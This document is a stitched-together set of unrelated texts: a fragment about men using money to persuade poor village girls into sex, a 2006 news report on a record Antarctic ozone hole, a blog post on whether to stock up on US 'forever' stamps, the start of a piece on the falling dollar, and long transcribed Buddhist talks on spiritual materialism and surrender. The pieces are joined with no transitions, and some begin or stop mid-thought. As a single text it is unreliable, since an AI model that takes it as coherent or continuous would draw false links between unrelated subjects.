They go to poor villages , knowing that a small amount of money can sometimes persuade girls to agree to sex , sometimes with the knowledge of their families , without thinking of the long - term consequences .

Space agency reports biggest - ever ozone hole over Antarctic dpa German Press Agency
Published : Friday October 20 , 2006 Washington -
The US space agency NASA announced Thursday that atmospheric scientists in recent weeks observed the largest hole in the ozone layer ever recorded over the Southern Hemisphere .
Gaps in the ozone layer , which blocks much of the sun 's harmful ultraviolet rays , expand and contract over time but are blamed primarily on human activity that releases chlorine and bromine gases that destroy zone .
Depleted ozone patches are especially exposed at Earth 's poles .
" From September 21 to 30 , the average area of the ozone hole was the largest ever observed , at 10.6 million square miles , " Paul Newman , atmospheric scientist at NASA 's Goddard Space Flight Centre , said in a statement .
The ozone hole reported over the Antarctic was larger than the surface area of North America .
An instrument on NASA 's Aura satellite measured total ozone from Earth 's surface to the upper atmosphere .
Other US government scientists used instruments mounted on balloons to make direct measurements of ozone over the South Pole .
Measurements taken in early October showed even lower concentrations of ozone , particularly at an altitude of 13 to 21 kilometres , showing that the ozone layer was " virtually gone in this layer of the atmosphere , " said David Hofmann , director of the US National Oceanic and Atmospheric Administration 's Earth System Research Laboratory .
" The depleted layer has an unusual vertical extent this year , so it appears that the 2006 ozone hole will go down as a record - setter . "

Yesterday , the United States Postal Service announced the introduction of a “ forever ” postage stamp .
Here ’s how it works : whenever you buy a first class postage stamp , it will no longer be marked with a cash denomination on it like current stamps are .
Instead , it will merely say “ First Class ” on it .
Once you buy it , you can use it at any point in the future .
For example , if you buy a 39 cent “ forever ” stamp today , and then the postal service raises rates a few times , leaving a stamp ’s price at fifty cents in 2020 , you could still use that same “ forever ” stamp to mail a letter , even though you paid only 39 cents for it .
Why is the postal service doing this ?
They have two reasons .
First , by doing this , they do n’t have to make one , two , and three cent stamps in large quantities any more , as these stamps now cost as much or more to make than their face value .
Second , by giving them your thirty nine cents now , you basically allow them to use that money immediately while you might not use those stamps for a very long time .
This period allows the postal service to maximize the use of those stamps .
Is this a good deal for individual stamp buyers ?
Before we dig into the calculations , it should be noted that in general this increases the flexibility for consumers without raising prices , so by default it is a good deal for consumers – anything that makes a product better without increasing prices is a good thing .
How do I maximize the benefit ?
Can you really gain a lot by stocking up on stamps before a rate increase ?
The only way to really tell is by looking at the recent history of stamp price increases .
I ’m only going to use price increases since January 1 , 1980 , where the price was 15 cents for a first class stamp .
Thus , between January 1 , 1980 and January 1 , 2007 ( a period of 27 years ) , stamps saw an average annual increase of 3.6023 % .
On the other hand , in January 1980 , the Consumer Price Index ( the most common number used to estimate inflation ) was at 77.8 and in January 2007 , it was at 202.4 .
Thus , between January 1980 and January 2007 , inflation saw an annual average of 3.6046 % .
3.6023 % … 3.6046 % … it turns out that the rate of postage stamp increase is amazingly close to the rate of inflation in recent years .
This is because that postage stamps are hedged to match inflation , as the postal service is n’t out to make a profit , but to break even .
However , there is one big difference : inflation is fairly steady , but the postal service jumps regularly .
This means that if you buy a bunch of stamps just before a jump ( even a year ’s supply of them ) , you can beat inflation by quite a bit with your postage stamp purchase .
Want to visualize this ?
Here ’s a graph showing stamp prices ( I used the price of 519 stamps so the dollar amount is comparable to the raw number of the CPI ) versus the CPI since January 1 , 1980 :
As you can see , they match reasonably well , but something else should stick out at you : stamps were at their biggest bargain just before the rates went up .
In other words , when the “ forever ” stamp goes into effect , buying a bunch of stamps just before a rate increase is a very effective way to save money .
You can easily outpace inflation with this “ investment ” and even outpace a lot of other investments , including money market accounts .
Of course , over a longer period of time ( a period of two stamp rate increases or more ) , the price increases begin to match inflation , and that ’s not a good investment .
To summarize : I plan on buying a few hundred “ forever ” stamps just before the next rate hike , but not more than I could use in a year .
This lets me maximize the benefit of beating a rate hike , but does n’t lock me into an “ investment ” that merely stays the same as inflation .
A Currency in Decline How Dangerous is the Dollar Drop ?
Is an end of an era looming in the foreign exchange markets ?
The dollar has been depreciating against the euro for weeks .
Currency experts and the German government do n't yet see this as cause for alarm .
The US currency 's role as a lead currency is n't as important as it used to be , they say .

Introduction
The following series of talks was given in Boulder , Colorado in the fall of 1970 and the spring of 1971 .
At that time we were just forming Karma Dzong , our meditation center in Boulder .
Although most of my students were sincere in their aspiration to walk on the spiritual path , they brought to it a great deal of confusion , misunderstanding and expectation .
Therefore , I found it necessary to present to my students an overview of the path and some warnings as to the dangers along that path .
It now seems that publishing these talks may be helpful to those who have become interested in spiritual disciplines .
Walking the spiritual path properly is a very subtle process ; it is not something to jump into naively .
there are numerous sidetracks which lead to a distorted , ego - centered version of spirituality ; we can deceive ourselves into thinking we are developing spiritually when instead we are strengthening our egocentricity through spiritual techniques .
This fundamental distortion may be referred to as spiritual materialism .
These talks first discuss the various ways in which people involve themselves with spiritual materialism , the many forms of self - deception into which aspirants may fall .
After this tour of the sidetracks along the way , we discuss the broad outlines of the true spiritual path .
The approach presented here is a classical Buddhist one - not in a formal sense , but in the sense of presenting the heart of the Buddhist approach to spirituality .
Although the Buddhist way is not theistic it does not contradict the theistic disciplines .
Rather the differences between the ways are a matter of emphasis and method .
The basic problems of spiritual materialism are common to all spiritual disciplines .
The Buddhist approach begins with our confusion and suffering and works toward the unraveling of their origin .
The theistic approach begins with the richness of God and works toward raising consciousness so as to experience God 's presence .
But since the obstacles to relating with God are our confusions and negativities , the theistic approach must also deal with them .
Spiritual pride , for example , is as much a problem in the theistic disciplines as in Buddhism .
According to the Buddhist tradition , the spiritual path is the process of cutting through our confusion , of uncovering the awakened state of mind .
When the awakened state of mind is crowded in by ego and its attendant paranoia , it takes on the character of an underlying instinct .
So it is not a matter of building up the awakened state of mind , but rather of burning out the confusions which obstruct it .
In the process of burning out these confusions , we discover enlightenment .
If the process were otherwise , the awakened state of mind would be a product , dependent upon cause and effect and therefore liable to dissolution .
Anything which is created must , sooner or later , die .
If enlightenment were created in such a way , there would always be the possibility of ego reasserting itself , causing a return to the confused state .
Enlightenment is permanent because we have not produced it ; we have merely discovered it .
In the Buddhist tradition the analogy of the sun appearing from behind the clouds is often used to explain the discovery of enlightenment .
In the meditation practice we clear away the confusion of ego in order to glimpse the awakened state .
The absence of ignorance , of being crowded in , of paranoia , opens up a tremendous view of life .
One discovers a different way of being .
The heart of the confusion is that man has a sense of self which seems to him to be continuous and solid .
When a though or emotion or even occurs , there is a sense of someone being conscious of what is happening .
You sense that you are reading these words .
This sense of self is actually a transitory , discontinuous event , which in our confusion seems to be quite solid and continuous .
Since we take our confused view as being real , we struggle to maintain and enhance this solid self .
We try to feed it pleasures and shield it from pain .
Experience continually threatens to reveal our transitoriness to us , so we continually struggle to cover up any possibility of discovering our real condition .
" But , " we might ask , " if our real condition is an awakened state , why are we so busy trying to avoid becoming aware of it ? "
It is because we have become so absorbed in our confused view of the world , that we consider it real , the only possible world .
This struggle to maintain the sense of a solid , continuous self is the action of ego .
Ego , however , is only partially successful in shielding us from pain .
It is the dissatisfaction which accompanies ego's struggle that inspires us to examine what we are doing .
Since there are always gaps in our self - consciousness , some insight is possible .
An interesting metaphor used in Tibetan Buddhism to describe the functioning of ego is that of the " Three Lords of Materialism " : the " Lord of Form , " the " Lord of Speech , " and the " Lord of Mind . "
In the discussion of the Three Lords which follows , the words " materialism " and " neurotic " refer to the action of ego .
The Lord of Form refers to the neurotic pursuit of physical comfort , security and pleasure .
Our highly organized and technological society reflects our preoccupation with manipulating physical surroundings so as to shield ourselves from the irritations of the raw , rugged , unpredictable aspects of life .
Push - button elevators , pre-packaged meat , air conditioning , flush toilets , private funerals , retirement plans , mass , production , weather satellites , bulldozers , fluorescent lighting , nine - to - five jobs , television - all are attempts to create a manageable , safe , predictable , pleasurable world .
The Lord of Form does not signify the physically rich and secure life - situations we create per se .
Rather it refers to the neurotic preoccupation that drives us to create them , to try to control nature .
It is ego's ambition to secure and entertain itself , trying to avoid all irritation .
So we cling to our pleasures and possessions , we fear change or force change , we try to create a nest or playground .
The Lord of Speech refers to the use of intellect in relating to our world .
We adopt sets of categories which serve as handles , as ways of managing phenomena .
The most fully developed products of this tendency are ideologies , the systems of ideas that rationalize , justify and sanctify our lives .
Nationalism , communism , existentialism Christianity , Buddhism - all provide us with identities , rules of action , and interpretations of how and why things happen as they do .
Again , the use of intellect is not in itself the Lord of Speech .
The Lord of Speech refers to the inclination on the part of ego to interpret anything that is threatening or irritating in such a way as to neutralize the threat or turn it into something " positive " from the ego 's point of view .
The Lord of Speech refers to the use of concepts as filters to screen us from a direct perception of what is .
The concepts are taken too seriously ; they are used as tools to solidify our world and ourselves .
If a world of nameable things exists , then " I " as one of the nameable things exists as well .
We wish not to leave any room for threatening doubt , uncertainty or confusion .
The Lord of Mind refers to the effort of consciousness to maintain awareness of itself .
The Lord of Mind rules when we use spiritual and psychological disciplines as the means of maintaining our self - consciousness , of holding onto our sense of self .
Drugs , yoga , prayer , meditation , trances , various psychotherapies - all can be used in this way .
Ego is able to convert everything to its own use , even spirituality .
For example , if you have learned of a particularly beneficial meditation technique of spiritual practice , then ego's attitude is , first to regard it as an object of fascination and , second to examine it .
Finally , since ego is seeming solid and cannot really absorb anything , it can only mimic .
Thus ego tries to examine and imitate the practice of meditation and the meditative way of life .
When we have learned all the tricks and answers of the spiritual game , we automatically try to imitate spirituality , since real involvement would require the complete elimination of ego , and actually the last thing we want to do is to give up the ego completely .
However , we cannot experience that which we are trying to imitate ; we can only find some area within the bounds of ego that seems to be the same thing .
Ego translates everything in terms of its own state of health , its own inherent qualities .
It feels a sense of great accomplishment and excitement at have been able to create such a pattern .
At last it has created a tangible accomplishment , a confirmation of its own individuality .
If we become successful at maintaining our self - consciousness through spiritual techniques , then genuine spiritual development is highly unlikely .
Our mental habits become so strong as to be hard to penetrate .
We may even go so far as to achieve the totally demonic state of complete " Egohood . "
Even though the Lord of Mind is the most powerful in subverting spirituality , still the other two Lords can also rule the spiritual practice .
Retreat to nature , isolation , simple , quiet , high people - all can be ways of shielding oneself from irritation , all can be expressions of the Lord of Form .
Or perhaps religion may provide us with a rationalization for creating a secure nest , a simple but comfortable home , for acquiring an amiable mate , and a stable , easy job .
The Lord of Speech is involved in spiritual practice as well .
In following a spiritual path we may substitute a new religious ideology for our former beliefs , but continue to use it in the old neurotic way .
Regardless of how sublime our ideas may be , if we take them too seriously and use them to maintain our ego , we are still being ruled by the Lord of Speech .
Most of us , if we examine our actions , would probably agree that we are ruled by one or more of the Three Lords .
" But , " we might ask , " so what ?
This is simply a description of the human condition .
Yes , we know that our technology cannot shield us from war , crime , illness , economic insecurity , laborious work , old age and death ; nor can our ideologies shield us from doubt , uncertainty , confusion and disorientation ; nor can our therapies protect us from the dissolution of the high states of consciousness that we may temporarily achieve and the disillusionment and anguish that follow .
But what else are we to do ?
The Three Lords seem too powerful to overthrow , and we do n't know what to replace them with . "
The Buddha , troubled by these questions , examined the process by which the Three Lords rule .
He questioned why our minds follow them and whether there is another way .
He discovered that the Three Lords seduce us by creating a fundamental myth : that we are solid beings .
But ultimately the myth is false , a huge hoax , a gigantic fraud , and it is the root of our suffering .
In order to make this discover he had to break through very elaborate defenses erected by the Three Lords to prevent their subjects from discovering the fundamental deception which is the source of their power .
We cannot in any way free ourselves from the domination of the Three Lords unless we too cut through , layer by layer , the elaborate defenses of these Lords .
The Lords ' defenses are created out of the material of our minds .
This material of mind is used by the Lords in such a way as to maintain the basic myth of solidity .
In order to see for ourselves how this process works we must examine our own experience .
" But how , " we might ask , " are we to conduct the examination ?
What method or tool are we to use ? "
The method that the Buddha discovered is meditation .
He discovered that struggling to find answers did not work .
It was only when there were gaps in his struggle that insights came to him .
He began to realize that there was a sane , awake quality within him which manifested itself only in the absence of struggle .
So the practice of meditation involves " letting be . "
There have been a number of misconceptions regarding meditation .
Some people regard it as a trancelike state of mind .
Others think of it in terms of training , in the sense of mental gymnastics .
But meditation is neither of these , although it does involve dealing with neurotic states of mind .
The neurotic state of mind is not difficult or impossible to deal with .
It has energy , speed and a certain pattern .
The practice of meditation involves letting be - trying to go with the patter , trying to go with the energy and the speed .
In this way we learn how to deal with these factors , how to relate with them , not in the sense of causing them to mature in the way we would like , but in the sense of knowing them for what they are and working with their pattern .
There is a story regarding the Buddha which recounts how he once gave teaching to a famous sitar player who wanted to study meditation .
The musician asked , " Should I control my mind or should I completely let go ? "
The Buddha answered , " Since you are a great musician , tell me how you would tune the strings of your instrument . "
The musician said , " I would make them not too tight and not too loose . "
" Likewise , " said the Buddha , " in you meditation practice you should not impose anything too forcefully on your mind , nor should you let it wander . "
That is the teaching of letting the mind be in a very open way , of feeling the flow of energy without trying to subdue it and without letting it get out of control , of going with the energy pattern of the mind .
This is meditation practice .
Such practice is necessary generally because our thinking pattern , our conceptualized way of conducting our life in the world , is either too manipulative , imposing itself upon the world , or else runs completely wild and uncontrolled .
Therefore , our meditation practice must begin with ego's outermost layer , the discursive thoughts which continually run through our minds , our mental gossip .
The Lords use discursive thought as their first line of defense , as the pawns in their effort to deceive us .
The more we generate thoughts , the busier we are mentally and the more convinced we are of our existence .
So the Lords are constantly trying to activate these thoughts , trying to create a constant overlapping of thoughts so that nothing can be seen beyond them .
In true meditation there is no ambition to stir up thoughts , nor is there an ambition to suppress them .
They are just allowed to occur spontaneously and become an expression of basic sanity .
They become the expression of the precision and the clarity of the awakened state of mind .
If the strategy of continually creating overlapping thoughts is penetrated , then the Lords stir up emotions to distract us .
The exciting , colorful , dramatic quality of the emotions captures our attention as if we were watching an absorbing film show .
In the practice of meditation we neither encourage emotions nor repress them .
By seeing them clearly , by allowing them to be as they are , we no longer permit them to serve as a means of entertaining or distracting us .
Thus they become the inexhaustible energy which fulfills egoless action .
In the absence of thoughts and emotions the Lords bring up a still more powerful weapon , concepts .
Labeling phenomena creates a feeling of a solid definite world of " things . "
Such a solid world reassures us that we are a solid , continuous thing as well .
The world exists , therefore I , the perceiver of the world , exist .
Meditation involves seeing the transparency of concepts , so that labeling no longer serves as a way of solidifying our world and our image of self .
Labeling becomes simply the act of discrimination .
The Lords have still further defense mechanisms , but it would be too complicated to discuss them in this context .
By the examination of his own thoughts , emotions , concepts and the other activities of mind , the Buddha discovered that there is no need to struggle to prove our existence , that we need not be subject to the rule of the Three Lords of Materialism .
There is no need to struggle to be free ; the absence of struggle is in itself freedom .
This egoless state is the attainment of Buddhahood .
The process of transforming the material of mind from expressions of ego's ambition in to expressions of basic sanity and enlightenment through the practice of meditation - this might be said to be the Spiritual Materialism
We have come here to learn about spirituality .
I trust the genuine quality of this search but we must question its nature .
The problem is that ego can convert anything to its own use , even spirituality .
Ego is constantly attempting to acquire and apply the teachings of spirituality for its own benefit .
The teachings are treated as an external thing , external to " me , " a philosophy which we try to imitate .
We do not actually want to identify with or become the teachings .
So if our teacher speaks of renunciation of ego , we attempt to mimic renunciation of ego .
We go through the motions , make the appropriate gestures , but we really do not want to sacrifice any part of our way of life .
We become skillful actors , and while playing deaf and dumb to the real meaning of the teachings , we find some comfort in pretending to follow the path .
Whenever we begin to feel any discrepancy or conflict between our actions and the teachings , we immediately interpret the situation in such a way that the conflict is smoothed over .
The interpreter is ego in the role of spiritual advisor .
The situation is like that of a country where church and state are separate .
If the policy of the state is foreign to the teachings of the church , then the automatic reaction of the king is to go to the head of the church , his spiritual advisor , and ask his blessing .
The head of the church then works out some justification and gives the policy his blessing under the pretense that the king is the protector of the faith .
In an individual 's mind , it works out very neatly that way , ego being both king and head of the church .
This rationalization of the spiritual path and one 's actions must be cut through if true spirituality is to be realized .
However , such rationalizing is not easy to deal with because everything is seen through the filter of ego's philosophy and logic , making all appear neat , precise and very logical .
We attempt to find a self - justifying answer for every question .
In order to reassure ourselves , we work to fit into our intellectual scheme every aspect of our lives which might be confusing .
And our effort is so serious and solemn , so straight - forward and sincere , that it is very difficult to be suspicious of it .
We always trust the " integrity " of our spiritual advisor .
It does not matter what we use to achieve self - justification : the wisdom of sacred books , diagrams or charts , mathematical calculations , esoteric formulae , fundamentalists religion , depth psychology , or any other mechanism .
Whenever we begin to evaluate , deciding that we should or should not do this or that , then we have already associated our practice or our knowledge with categories , one pitted against the other , and that is spiritual materialism , the false spirituality of our spiritual advisor .
Whenever we a have a dualistic notion such as , " I am doing this because I want to achieve a particular state of consciousness , a particular state of being , " the automatically we separate ourselves from the reality of what we are .
If we ask ourselves , " What is wrong with evaluating , with taking sides ? " , the answer is that , when we formulate a secondary judgment , " I should be doing this and should avoid doing that , " then we have achieved a level of complication which takes us a long way from the basic simplicity of what we are .
The simplicity of meditation means just experiencing the ape instinct of ego .
If anything more than this is laid onto our psychology , then it becomes a very heavy , thick mask , a suit of armor .
It is important to see that the main point of any spiritual practice is to step out of the bureaucracy of ego .
This means stepping out of ego's constant desire for a higher , more spiritual , more transcendental version of knowledge , religion , virtue , judgment , comfort or whatever it is that a particular ego is seeking .
One must step out of spiritual materialism .
If we do not step out of spiritual materialism , if we in fact practice it , then we may eventually find ourselves possessed of a huge collection of spiritual paths .
We may feel these spiritual collections to be very precious .
We have studied so much .
We may have studied Western philosophy or Oriental philosophy , practiced yoga or perhaps studied under dozens of great masters .
We have achieved and we have learned .
We believe that we have accumulated a hoard of knowledge .
And yet , having gone through all this , there is still something to give up .
It is extremely mysterious !
How could this happen ?
Impossible !
But unfortunately it is so .
Our vast collections of knowledge and experience are just part of ego's display , part of the grandiose quality of ego .
We display them to the world and , in so doing , reassure ourselves that we exist , safe and secure , as " spiritual " people .
But we have simply created a shop , an antique shop .
We could be specializing in oriental antiques or medieval Christian antiques or antiques from some other civilization or time , but we are , nonetheless , running a shop .
Before we filled our shop with so many things the room was beautiful : whitewashed walls and a very simple floor with a bright lamp burning in the ceiling .
There was one object of art in the middle of the room and it was beautiful .
Everyone who came appreciated its beauty , including ourselves .
But we were not satisfied and we thought , " Since this one object makes my room so beautiful , if I get more antiques , my room will be even more beautiful . "
So we began to collect , and the end result was chaos .
We searched the world over for beautiful objects - India , Japan , many different countries .
And each time we found an antique , because we were dealing with only one object at a time , we saw it as beautiful and thought it would be beautiful in our shop .
But when we brought the object home and put it there , it became just another addition to our junky collection .
The beauty of the object did not radiate out any more , because it was surrounded by so many other beautiful things .
It did not mean anything anymore .
Instead of a room full of beautiful antiques we created a junk shop !
Proper shopping does not entail collecting a lot of information or beauty , but it involves fully appreciating each individual object .
This is very important .
If you really appreciate an object of beauty , then you completely identify with it and forget yourself .
It is like seeing a very interesting , fascinating movie and forgetting that you are the audience .
At that moment there is no world ; your whole being is that scene of that movie .
It is that kind of identification , complete involvement with one thing .
Did we actually taste it and chew it and swallow it properly , that one object of beauty , that one spiritual teaching ?
Or did we merely regard it as a part of our vast and growing collection ?
I place so much emphasis on this point because I know that all of us have come to the teachings and practice of meditation not to make a lot of money , but because we genuinely want to learn , want to develop ourselves .
But if we regard knowledge as an antique , as " ancient wisdom " to be collected , then we are on the wrong path .
As far as the lineage of teachers is concerned , knowledge is not handed down like an antique .
Rather , one teacher experiences the truth of the teachings , and he hands it down as inspiration to his student .
That inspiration awakens the student , as his teacher was awakened before him .
Then the student hands down the teachings to another student and so the process goes .
The teachings are always up to date .
They are not " ancient wisdom , " an old legend .
The teachings are not passed along as information , handed down as a grandfather tells traditional folk tales to his grandchildren .
It does not work that way .
It is real experience .
There is a saying in the Tibetan scriptures : " Knowledge must be burned , hammered and beaten like pure gold .
Then one can wear it as an ornament . "
So when you receive spiritual instruction from the hands of another , you do not take it uncritically , but you burn it , you hammer it , you beat it , until the bright , dignified color of gold appears .
Then you craft it into an ornament , whatever design you like , and you put it on .
Therefore , dharma is applicable to every age , to every person ; it has a living quality .
It is not enough to imitate your master or guru ; you are not trying to become a replica of your teacher .
The teachings are an individual persona experience , right down to the present holder of the doctrine .
Perhaps many of my readers are familiar with the stories of Naropa and Tilopa and Marpa and Milarepa and Gampopa and the other teachers of the Kagy lineage .
It was a living experience for them , and it is a living experience for the present holders of the lineage .
Only the details of their life - situations are different .
The teachings have the quality of warm , fresh baked bread ; the bread is still warm and hot and fresh .
Each baker must apply the general knowledge of how to make bread to his particular dough and oven .
Then he must personally experience the freshness of this bread and must cut if fresh and eat it warm .
He must make the teachings his own and then must practice them .
It is a very living process .
There is no deception in terms of collecting knowledge .
We must work with our individual experiences .
When we become confused , we cannot turn back to our collection of knowledge and try to find some confirmation or consolation : " The teacher and the whole teaching is on my side . "
The spiritual path does not go that way .
It is a lonely , individual path .
Q. Do you think spiritual materialism is a particularly American problem ?
A . Whenever teachings come to a country from abroad , the problem of spiritual materialism is intensified .
At the moment America is , without any doubt , fertile ground ready for the teachings .
And because America is so fertile , seeking spirituality , it is possible for America to inspire charlatans .
Charlatans would not choose to be charlatans unless they were inspired to do so .
Otherwise , they would be bank robbers or bandits , inasmuch as they want to make money and become famous .
Because America is looking so hard for spirituality , religion becomes any easy way to make money and acquire fame .
So we see charlatans in the role of student , chela , as well as in the role of guru .
I think America at this particular time is a very interesting ground .
Q. Have you accepted any spiritual master as a guru , any particular living spiritual master ?
A . At present there is no one .
I left my gurus and teachers behind in Tibet , physically , but the teachings stay with me and continue .
Q. So who are you following , more or less ?
A. Situations are the voice of my guru , the presence of my guru .
Q. After Shakyamuni Buddha attained enlightenment , was there some trace of ego left in him so that he could carry on his teachings ?
A . The teaching just happened .
He did not have the desire to teach or not to teach .
He spent seven weeks sitting under the shade of a tree and walking along the bank of a river .
Then someone just happened along and he began to speak .
One has no choice ; you are there , an open person .
Then the situation presents itself and teaching happens .
That is what is called " Buddha activity . "
Q. It is difficult not to become acquisitive about spirituality .
Is this desire for acquisitions something that is shed along the way ?
A . You should let the first impulse die down .
Your first impulse toward spirituality might put you into some particular spiritual scene ; but if you work with that impulse , then the impulse gradually dies down and at some stage becomes tedious , monotonous .
This is a useful message .
You see , it is essential to relate to yourself , to your own experience , really .
If one does not relate to oneself , then the spiritual path becomes dangerous , becomes purely external entertainment , rather than an organic personal experience .
Q. If you decide to seek your way out of ignorance , you can almost definitely assume that anything you do that feels good will be beneficial to the ego and actually blocking the path .
Anything that seems right to you will be wrong , anything that does n't turn you upside - down will bury you .
Is there any way out of this ?
A . If you perform some act which is seemingly right , it does not mean that it is wrong , for the very reason that wrong and right are out of the picture altogether .
You are not working on any side , neither the " good " side nor the " bad " side , but you are working with the totality of the whole , beyond " this " and " that . "
I would say there is complete action .
There is no partial act , but whatever we do in connection with good and bad seems to be a partial act .
Q. If you are feeling very confused and trying to work your way out of the confusion , it would seem that you are trying too hard .
But if you do not try at all , then are we to understand that we are fooling ourselves ?
A. Yes , but that does not mean that one has to live by the extremes of trying too hard or not trying at all .
One has to work with a kind of " middle way , " a complete state of " being as you are .
"
We could describe this with a lot of words , but one really has to do it .
If you really start living the middle way , then you will see it , you will find it .
You must allow yourself to trust yourself , to trust in your own intelligence .
We are tremendous people , we have tremendous things in us .
We simply have to let ourselves be .
External aid cannot help .
If you are not willing to let yourself grow , then you fall into the self - destructive process of confusion .
It is self - destruction rather than destruction by someone else .
That is why it is effective ; because it is self - destruction .
Q. What is faith ?
Is it useful ?
A. Faith could be simple - minded , trusting , blind faith , or it could be definite confidence which cannot be destroyed .
Blind faith has no inspiration .
It is very naive .
It is not creative , though not exactly destructive .
It is not creative because your faith and yourself have never made any connection , any communication .
You just blindly accepted the whole belief , very naively .
In the case of faith as confidence , there is a living reason to be confident .
You do not expect that there will be a prefabricated solution mysteriously presented to you .
You work with existing situations without fear , without any doubt about involving yourself .
This approach is extremely creative and positive .
If you have definite confidence , you are so sure of yourself that you do not have to check yourself .
It is absolute confidence , real understanding of what is going on now , therefore you do not hesitate to follow other paths or deal in whatever way is necessary with each new situation .
Q. What guides you on the path ?
A. Actually , there does not seem to be any particular guidance .
In fact , if someone is guiding you , that is suspicious , because you are relying on something external .
Being fully what you are in yourself becomes guidance , but not in the sense of vanguard , because you do not have a guide to follow .
You do not have to follow someone 's tail , but you sail along .
In other words , the guide does not walk ahead of you , but walks with you .
Q. Could you say something more about the way in which meditation short - circuits the protective mechanisms of the ego ?
A . The protective mechanism of ego involves checking oneself , which is an unnecessary kind of self - observance .
Meditation is not based on meditating on a particular subject by checking oneself ; but meditation is complete identification with whatever techniques you are employing .
Therefore there will be no effort to secure oneself in the practice of meditation .
Q. I seem to be living in a spiritual junkyard .
How can I make it into a simple room with one beautiful object ?
A . In order to develop an appreciation of you collection you have to start with one item .
One has to find a stepping stone , a source of inspiration .
Perhaps you would not have to go through the rest of the items in your collection if you studied just one piece of material .
That one piece of material could be a sign - post that you managed to confiscate in New York City , it could be as insignificant as that .
But one must start with one thing , see its simplicity , the rugged quality of this piece of junk or this beautiful antique .
If we could manage to start with just one thing , then that would be the equivalent of having one object in an empty room .
I think it is a question of finding a stepping stone .
Because we have so many possessions in our collection , a large part of the problem is that we do not know where to begin .
One has to allow one 's instinct to determine which will be the first thing to pick up .
Q. Why do you think that people are so protective of their egos ?
Why is it so hard to let go of one 's ego ?
A. People are afraid of emptiness of space , or the absence of company , the absence of a shadow .
It could be a terrifying experience to have no one to relate to , nothing to relate with .
The idea of it can be extremely frightening , though not the real experience .
It is generally a fear of space , a fear that we will not be able to anchor ourselves to any solid ground , that we will lose our identity as a fixed and solid and definite thing .
This could be very threatening .
Surrendering
At this point we may have come to the conclusion that we should drop t he whole game of spiritual materialism ; that is , we should give up trying to defend and improve ourselves .
We may have glimpsed that our struggle is futile and may wish to surrender , to completely abandon our efforts to defend ourselves .
But how many of us could actually do this ?
It is not as simple and easy as we might think .
To what degree could we really let go and be open ?
At what point would we become defensive ?
In this lecture we will discuss surrendering , particularly in terms of the relationship between work on the neurotic state of mind and work with a personal guru or teacher .
Surrendering to the " guru " could mean opening our minds to life - situations as well as to an individual teacher .
However , if our life - style and inspiration is working toward an unfolding of the mind , then we will almost certainly find a personal guru as well .
So in the next few talks we will emphasize relating to a personal teacher .
One of the difficulties in surrendering to a guru is our preconceptions regarding him and our expectations of what will happen with him .
We are preoccupied with ideas of what we would like to experience with our teacher : " I would like to see this ; that would be the best way to see it ; I would like to experience this particular situation , because it is in exact accordance with my expectation and fascination . "
So we try to fit things into pigeonholes , try to fit the situation to our expectations , and we cannot surrender any part of our anticipation to all .
If we search for a guru or teacher , we expect him to be saintly , peaceful , quiet , a simple and wise man .
When we find that he does not match our expectations , then we begin to be disappointed , we begin to doubt .
In order to establish a real teacher - student relationship it is necessary for us to give up all our preconceptions regarding that relationship and the condition of opening and surrender .
" Surrender " means opening oneself completely , trying to get beyond fascination and expectation .
Surrender also means acknowledging the raw , rugged , clumsy and shocking qualities of one 's ego , acknowledging them and surrendering them as well .
Generally , we find it very difficult to give out and surrender our raw and rugged qualities of ego .
Although we may hate ourselves , at the same time we find our self - hatred a kind of occupation .
In spite of the fact that we may dislike what we are and find that self - condemnation painful , still we cannot give it up completely .
If we begin to give up our self - criticism , then we may feel that we are losing our occupation , as though someone were taking away our job .
We would have no further occupation if we were to surrender everything ; there would be nothing to hold on to .
Self - evaluation and self - criticism are , basically , neurotic tendencies which derive from our not having enough confidence in ourselves , " confidence " in the sense of seeing what we are , knowing what we are , knowing we can afford to open .
We can afford to surrender that raw and rugged neurotic quality of self and step out of fascination , step out of preconceived ideas .
We must surrender our hopes and expectations , as well as our fears , and march directly into disappointment , work with disappointment , go into it and make it our way of life , which is a very hard thing to do .
Disappointment is a good sign of basic intelligence .
It can not be compared to anything else : it is so sharp , precise , obvious and direct .
If we can open , then we suddenly begin to see that our expectations are irrelevant compared with the reality of the situations we are facing .
This automatically brings a feeling disappointment .
Disappointment is the best chariot to use on the path of the dharma .
It does not confirm the existence of our ego and its dreams .
However , if we are involved with spiritual materialism , if we regard spirituality as a part of our accumulation of learning and virtue , if spirituality becomes a way of building ourselves up , then of course the whole process of surrendering is completely distorted .
If we regard spirituality as a way of making ourselves comfortable , then whenever we experience something unpleasant , a disappointment , we try to rationalize it : " Of course this must be an act of wisdom the part of the guru , because I know , I 'm quite certain the guru does n't do harmful things .
Guruji is a perfect being and whatever Guruji does is right .
Whatever Guruji does is for me , because he is on my side .
So I can afford to open .
I can safely surrender .
I know that I am treading on the right path . "
Something is not quite right about such an attitude .
It is , at best , simple - minded and naive .
We are captivated by the awesome , inspiring , dignified and colorful aspect of " Guruji . "
We dare not contemplate any other way .
We develop the conviction that whatever we experience is part of our spiritual development .
" I 've made it , I have experienced it , I am a self - made person and I know everything , roughly , because I 've read books and they confirm my beliefs , my rightness , my ideas .
Everything coincides . "
We can old back in still another way , not really surrendering because we feel that we are very genteel , sophisticated and dignified people .
" Surely we can't give ourselves to this dirty , ordinary street - scene of reality . "
We have the feeling that every step of the path should be a lotus petal and we develop a logic that interprets whatever happens to us accordingly .
If we fall , we create a soft landing which prevents sudden shock .
Surrendering does not involve preparing for a soft landing ; it means just landing on hard , ordinary ground , on rocky , wild countryside .
Once we open ourselves , then we land on what is .
Traditionally , surrendering is symbolized by such practices as prostration , which is the act of falling on the ground in a gesture of surrender .
At the same time we open psychologically and surrender completely by identifying ourselves with the lowest of the low , acknowledging our raw and rugged quality .
There is nothing that we fear to lose once we identify ourselves with the lowest of the low .
By doing so , we prepare ourselves to be an empty vessel , ready to receive the teachings .
In the Buddhist tradition , there is this basic formula : " I take refuge in the Buddha , I take refuge in the dharma , I take refuge in the sangha . "
I take refuge in the Buddha as the example of surrender , the example of acknowledging negativity as part of our makeup and opening to it .
I take refuge in the dharma - dharma , the " law of existence , " life as it is .
I am willing to open my eyes to the circumstances of life as they are .
I am not willing to view them as spiritual or mystical , but I am willing to see the situations of life as they really are .
I take refuge in the sangha .
" Sangha " means " community of people on the spiritual path , " " companions . "
I am willing to share my experience of the whole environment of life with my fellow pilgrims , my fellow searchers , those who walk with me ; but I am not willing to lean on them in order to gain support .
I am only willing to walk along with them .
There is a very dangerous tendency to lean on one another as we tread the path .
If a group of people leans one upon the other , then if one should happen to fall down , everyone falls down .
So we do not lean on anyone else .
